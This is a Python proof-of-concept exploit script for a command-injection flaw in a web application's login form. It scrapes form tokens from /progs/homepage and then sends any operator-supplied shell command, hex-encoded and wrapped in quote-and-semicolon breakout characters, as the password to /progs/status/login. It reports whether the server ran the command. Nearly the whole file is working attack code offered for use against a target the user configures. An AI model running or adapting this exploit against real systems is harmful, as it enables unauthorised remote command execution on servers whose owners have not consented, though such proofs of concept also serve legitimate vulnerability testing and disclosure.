# Copyright 2025 Steven Johnson
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

#!/usr/bin/env python3
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


## USER VARIABLES, PLEASE ADJUST THESE TO MATCH YOUR TARGET ##
base_url = "127.0.0.1"
base_connection_type = "http://"
base_port = "8888"
## USER VARIABLES, PLEASE ADJUST THESE TO MATCH YOUR TARGET ##

# Set a default command if none is specified. This command echos "exploitable" in the response.
base_command_encoded = "%01%78%78%78%27%3b%65%63%68%6f%20%65%78%70%6c%6f%69%74%61%62%6c%65%3b%65%63%68%6f%20%27%01"

def process_string(input_str):
    # Step 1: Append '; to the front and ';echo ' to the command
    modified_str = '\';' + input_str + ';echo \''
    
    # Step 2: Make sure the length is divisible by 4
    while len(modified_str) % 4 != 0:
        modified_str = 'x' + modified_str  # Add 'x' to the front
    
    # Step 3: Convert each character to its ASCII value, prefixed by %
    ascii_encoded = ''.join([f'%{ord(char):x}' for char in modified_str])

    # Step 4: Append %01 to the beginning and end
    final_str = f'%01{ascii_encoded}%01'
    
    return final_str

input_string = input("Enter your command to send or leave blank to test: ")
if input_string != "":
    command_encoded = process_string(input_string)
else:
    command_encoded = base_command_encoded

# Step 1: GET request to /progs/homepage to pull tokens
homepage_url = f"{base_connection_type}{base_url}:{base_port}/progs/homepage"
session = requests.Session()
response = session.get(homepage_url, verify=False)

if response.status_code != 200:
    print(f"Failed to load homepage: {response.status_code}")
    print(f"Are we sure {base_connection_type}{base_url}:{base_port}/progs/homepage is reachable?")
    exit(1)

# Step 2: Parse HTML and extract tokens
soup = BeautifulSoup(response.text, 'html.parser')
form = soup.find('form')

# You may need to adjust these based on actual form field names
token = form.find('input', {'name': 'token'})['value']
token2 = form.find('input', {'name': 'token2'})['value']

proceedVerify = input("It looks like I found a target and some tokens. Do you want to proceed? [y/N]")
if proceedVerify != "y":
    print("No action taken, exiting...")
    proceedVerify = "N"
    exit(0)

if input_string != "":
    print("Running the command " + input_string)
    print("The encoded command looks like: " + command_encoded)

# Step 3: Send POST request to /progs/status/login
login_url = f"{base_connection_type}{base_url}:{base_port}/progs/status/login"
payload = {
    'token': token,
    'token2': token2,
    'username': 'pwn',
    'password': command_encoded
}

login_response = session.post(login_url, data=payload, verify=False)

# Output the result
print(f"Login POST status code: {login_response.status_code}")
if input_string != "":
    print("Response body:")
    print(login_response.text)
else:
    if "exploitable" in login_response.text:
        print("✅ 'exploitable' found in response, server confirmed vulnerable.")
    else:
        print("❌ 'exploitable' not found in response.")

